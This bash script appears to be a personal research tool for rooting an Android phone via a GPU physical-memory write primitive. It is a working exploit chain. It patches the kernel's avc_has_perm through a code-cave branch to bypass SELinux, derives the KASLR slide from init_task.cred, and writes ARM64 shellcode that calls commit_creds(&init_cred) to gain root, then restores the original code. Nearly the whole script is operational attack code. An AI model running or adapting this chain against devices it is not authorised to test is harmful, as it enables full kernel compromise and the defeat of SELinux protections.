#!/usr/bin/env bash
# root-final.sh — end-to-end root using ONE GPU OPERATION PER PROCESS.
#
# Design (from the round-3 root cause, ROADMAP 5g):
#   * the GPU must be ACTIVELY RENDERING (screen awake + something drawing); we verify the animation
#     is alive before doing anything and abort otherwise;
#   * within a single process the SMMU caches the translation of the VA page used by the first GPU
#     operation, so later operations in that process are unreliable and their readbacks are worthless.
#     => every read and every write is its OWN process, and a write is only accepted when a SEPARATE
#        process reads the value back;
#   * acceptance is always a KERNEL-observable fact: getenforce for the SELinux flip, and the
#     trigger's own getuid() for root.
#   * everything is restored afterwards (text + SELinux); a reboot is the failsafe.
set -u
DIR=$(cd "$(dirname "$0")" && pwd)
[ -f "$DIR/../device.env" ] && . "$DIR/../device.env"
S=${ZF9_SERIAL:?set ZF9_SERIAL (or create device.env)}
STAMP=$(date +%Y%m%d-%H%M%S)
LOG=$HOME/Dev/zenfone9-root/logs/final-$STAMP; mkdir -p "$LOG"
PATCH_ADDR=0xa8145af0
# SELinux: instead of flipping selinux_state.enforcing (a HOT data cache line - our GPU store gets
# clobbered by the CPU's writeback, measured repeatedly), patch avc_has_perm's entry IN TEXT to
# "mov w0, wzr; ret" so every permission check returns allowed. Text lines are CPU-clean, so device
# stores survive there - the same property that makes the capset patch work.
AVC_ADDR=0xa88bb740
# avc_has_perm is called on EVERY permission check, so a multi-dword patch is fatal: the intermediate
# state gets executed almost immediately (that is what rebooted the device). Instead stage
# "mov w0, wzr; ret" in an unreachable code cave (alignment padding after memcpy's tail - partial
# writes there are inert because nothing jumps to it yet), then patch avc_has_perm's ENTRY with a
# SINGLE branch dword: atomic, no window.
AVC_CAVE=0xa801c7e4
ORIG=(d503233f d10203ff f800865e a9047bfd a9055ff8 a90657f6 a9074ff4 910103fd 90010d28 f9448908 aa0103f4 910073e1 aa0003f5)

adb_s() { adb -s "$S" shell "$1" </dev/null 2>&1 | tr -d '\r'; }
rd() { adb_s "CHEESE_PROBE_ONLY=1 CHEESE_NO_RETRY=1 CHEESE_TARGET_PA=$1 timeout 120 /data/local/tmp/cheese_pa > /data/local/tmp/rf.txt 2>&1; grep -o 'value=0x[0-9a-f]*' /data/local/tmp/rf.txt | head -1" | sed 's/value=//'; }
wr() { adb_s "CHEESE_POKE=1 CHEESE_NO_RETRY=1 CHEESE_TARGET_PA=$1 CHEESE_WRITE_PA=$1 CHEESE_WRITE_VAL=$2 timeout 240 /data/local/tmp/cheese_pa > /data/local/tmp/rf.txt 2>&1; grep -o 'POKE write.*' /data/local/tmp/rf.txt"; }

anim_on() {
    adb -s "$S" push "$DIR/../src/anim.sh" /data/local/tmp/anim.sh </dev/null >/dev/null 2>&1
    adb_s 'chmod 755 /data/local/tmp/anim.sh; svc power stayon true' >/dev/null
    adb_s 'input keyevent KEYCODE_WAKEUP; wm dismiss-keyguard' >/dev/null
    adb_s 'nohup sh /data/local/tmp/anim.sh >/dev/null 2>&1 &' >/dev/null
    sleep 4
    local n; n=$(adb_s 'pgrep -f anim.sh | wc -l')
    [ "${n:-0}" -ge 1 ] || { echo "[final] FATAL: GPU animation not alive"; return 1; }
    echo "[final] animation alive ($n), $(adb_s 'dumpsys power | grep -m1 mWakefulness=')"
}
anim_off() { adb_s 'pkill -f anim.sh; svc power stayon false' >/dev/null 2>&1; }

# write a dword and accept only on a SEPARATE-process read
wr_verified() {
    local a=$1 v=$2 got i
    got=$(rd "$a")
    [ "$got" = "$v" ] && { echo "  $a already $v"; return 0; }
    for i in 1 2 3; do
        wr "$a" "$v" >/dev/null
        sleep 2
        got=$(rd "$a")
        [ "$got" = "$v" ] && { echo "  $a <- $v VERIFIED (separate-process read)"; return 0; }
        echo "  attempt $i at $a: read back $got"
    done
    echo "  $a <- $v FAILED (read back $got)" >&2
    return 1
}

restore() {
    echo "[final] restoring text + SELinux"
    anim_on >/dev/null 2>&1 || true
    local i a
    for i in $(seq 0 2); do
        a=$(printf '0x%x' $((PATCH_ADDR + 4 * i)))
        wr_verified "$a" "0x${ORIG[$i]}" >/dev/null 2>&1 || echo "  restore[$i] $a unverified"
    done
    wr_verified "$AVC_ADDR" 0xd503233f >/dev/null 2>&1 || echo "  avc restore unverified"
    echo "[final] text[0]=$(rd $PATCH_ADDR) (want 0xd503233f)  selinux=$(adb_s getenforce)"
    anim_off
}
trap restore EXIT INT TERM

up=$(adb_s 'cut -d. -f1 /proc/uptime')
if [ "${up:-0}" -lt 180 ]; then
    echo "[final] waiting for the device to settle (vendor services re-assert SELinux early in boot)"
    while [ "$(adb_s 'cut -d. -f1 /proc/uptime')" -lt 180 ]; do sleep 10; done
fi
echo "[final] uptime: $(adb_s 'cut -d. -f1 /proc/uptime')s"

anim_on || exit 1

echo "[final] SELinux: staging gadget in a code cave, then ONE-DWORD branch at avc_has_perm"
wr_verified "$AVC_CAVE" 0x2a1f03e0 || { echo "[final] cave write failed"; exit 1; }
wr_verified "$(printf '0x%x' $((AVC_CAVE + 4)))" 0xd65f03c0 || { echo "[final] cave write failed"; exit 1; }
BR=$(python3 -c "
t=$AVC_CAVE; pc=$AVC_ADDR
imm=(t-pc)>>2
assert -0x2000000 < imm < 0x1ffffff, 'branch out of range'
print('0x%08x' % (0x14000000 | (imm & 0x03ffffff)))")
echo "[final] branch at avc entry: $BR -> cave $AVC_CAVE"
wr_verified "$AVC_ADDR" "$BR" || { echo "[final] avc branch failed"; exit 1; }
echo "[final] avc_has_perm entry now: $(rd $AVC_ADDR) (want $BR)"

echo "[final] deriving slide from init_task.cred (fresh-process reads)"
lo=$(rd 0xaa79c640); hi=$(rd 0xaa79c644)
RT=$(python3 - "$lo" "$hi" <<'PY'
import sys
lo = int(sys.argv[1], 16); hi = int(sys.argv[2], 16)
rt = (hi << 32) | lo
slide = rt - 0xffffffc00a7b0ae0
assert slide % 0x200000 == 0, "slide not 2MB aligned"
print("%#x %#x" % (rt, 0xffffffc008184c94 + slide))
PY
)
IC=$(echo "$RT" | cut -d' ' -f1); CC=$(echo "$RT" | cut -d' ' -f2)
echo "[final] init_cred_rt=$IC commit_creds_rt=$CC"

# The 13-dword shellcode with runtime literals (d2/d3 = init_cred, d6/d7 = commit_creds)
# 3-dword P1 patch: adrp x0,<init_cred page>; add x0,x0,#<off>; b commit_creds
# Tail-calls commit_creds(&init_cred) with no literals, no KASLR dependency in the encodings
# (ADRP/ADD/B are PC-relative / low-12 only), and only THREE writes instead of thirteen - which
# matters because the avc bypass destabilises the system if left active for long.
SC=$(python3 - "$IC" "$CC" <<'PY'
import sys
ic = int(sys.argv[1], 16); cc = int(sys.argv[2], 16)
pv = 0xffffffc008145af0 + (ic - 0xffffffc00a7b0ae0)      # patch site VA (link + slide)
def adrp(rd, target, pc):
    imm = ((target & ~0xfff) - (pc & ~0xfff)) >> 12
    return 0x90000000 | ((imm & 3) << 29) | (((imm >> 2) & 0x7FFFF) << 5) | rd
def addimm(rd, rn, imm12):
    return 0x91000000 | ((imm12 & 0xfff) << 10) | (rn << 5) | rd
def b(target, pc):
    return 0x14000000 | (((target - pc) >> 2) & 0x03ffffff)
print("%08x %08x %08x" % (adrp(0, ic, pv), addimm(0, 0, ic & 0xfff), b(cc, pv + 8)))
PY
)
echo "[final] patching 3 dwords (P1), one GPU op per process"
i=0
for v in $SC; do
    if [ "$i" = 12 ]; then :; fi
    wr_verified "$(printf '0x%x' $((PATCH_ADDR + 4 * i)))" "0x$v" || { echo "[final] patch incomplete at dword $i - aborting"; exit 1; }
    i=$((i + 1))
done
echo "[final] full-patch check (fresh reads):"
i=0; bad=0
for v in $SC; do
    got=$(rd "$(printf '0x%x' $((PATCH_ADDR + 4 * i)))")
    [ "$got" = "0x$v" ] || { echo "  dword $i = $got (want 0x$v)"; bad=$((bad+1)); }
    i=$((i + 1))
done
[ "$bad" = 0 ] && echo "  all 3 dwords confirmed by separate processes" || { echo "[final] $bad dwords wrong -> aborting"; exit 1; }

echo "[final] === TRIGGER (fresh process) ==="
adb -s "$S" shell "/data/local/tmp/call_capset" </dev/null 2>&1 | tee "$LOG/root.txt" | tail -14

echo "[final] rendering proof page"
adb_s 'am start -a android.intent.action.VIEW -d file:///sdcard/root-proof.html -t text/html' >/dev/null
sleep 4
adb -s "$S" exec-out screencap -p > "$LOG/root-proof-screen.png" 2>/dev/null
echo "[final] screenshot: $LOG/root-proof-screen.png ($(du -h "$LOG/root-proof-screen.png" 2>/dev/null | cut -f1))"

restore
trap - EXIT INT TERM
echo "[final] logdir: $LOG"
